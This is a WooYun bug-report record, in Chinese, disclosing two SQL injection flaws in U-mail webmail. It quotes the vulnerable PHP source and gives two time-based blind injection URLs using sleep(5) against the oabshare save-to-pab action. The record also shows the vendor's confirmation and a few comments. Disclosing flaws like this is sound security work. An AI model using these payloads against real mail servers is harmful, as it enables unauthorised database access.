{"id": 49175, "wybug_id": "wooyun-2014-074928", "wybug_title": "Umail最新版2处SQL注入漏洞可遍历数据库(续三)", "wybug_corp": "U-mail", "wybug_author": "pandas", "wybug_date": "2014-09-04 10:36", "wybug_open_date": "2014-12-03 10:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "14", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向公众公开  简要描述： 大牛们都去挖cmseasy了，我却还在挖umail。 详细说明：  Sqli 1：\\client\\mail\\module\\o_mail.phpLine：559\nif ( ACTION == \"mail-send\" ){    ...    if ( !$attach_list )    {        $attach_list = array( );    }    if ( $_FILES )    {        ...    }    $netdisk_files_id = gss( $_POST['nd_select_file'] );    $nd_send_files_id = gss( $_POST['nd_send_file'] );    if ( $nd_send_files_id && $netdisk_files_id )    {        $netdisk_files_id = implode( \",\", array(                        $netdisk_files_id,                        $nd_send_files_id        ) );        $netdisk_files_id = $nd_send_files_id;    }    if ( $netdisk_files_id )    {        include_once( LIB_PATH.\"Netdisk.php\" );        $Netdisk = Netdisk::getinstance( );        $netdiskFileArr = $Netdisk->getFileByIDS( $user_id, $netdisk_files_id); //跟踪        ...\n看上面的变量netdisk_files_id代入了getFileByIDS方法，跟踪下该方法：\npublic function getFileByIDS( $userid, $netdisk_files_id, $fields = \"*\", $debug = FALSE ){    $_obfuscate_IRFhnYw = \"user_id='\".$userid.\"' AND file_id IN (\".$netdisk_files_id.\")\";//这里的netdisk_files_id未过滤代入了SQL语句，看看注入吧。    $_obfuscate_6RYLWQ = $this->get_file( array(                    \"fields\" => $fields,                    \"where\" => $_obfuscate_IRFhnYw,                    \"orderby\" => \"file_name\",                    \"debug\" => $debug    ) );    return $_obfuscate_6RYLWQ;}\n手工先看下是不是存在注入：\n\n   漏洞证明：  \n\nSqli 2：（和我发的这个漏洞异曲同工：http://wooyun.org/bugs/wooyun-2010-072963）File：client\\oabshare\\module\\operates.phpLine: 235\nif ( ACTION == \"save-to-pab\" ){      .....\n直接给出payload：1. http://mail.domain.com:8099/webmail/client/oabshare/index.php?module=operate&action=save-to-pab&userlist=1) or if(1=11, 0, sleep(5))%23    因为1!=11,所以会执行后面的sleep(5)，执行时间会慢2. http://mail.domain.com:8099/webmail/client/oabshare/index.php?module=operate&action=save-to-pab&userlist=1) or if(1=1, 0, sleep(5))%23     因为1=1，所以这句执行会很快   修复方案：  过滤   版权声明：转载请注明来源 pandas@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-09 08:41 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-04 10:43 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  这管理给改的名？遍历数据库..    \n     2014-09-04 10:51 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  把手上握着的都交出来！！    \n     2014-09-04 11:11 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  @magerx 高工别这样，我也是现挖现提的。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}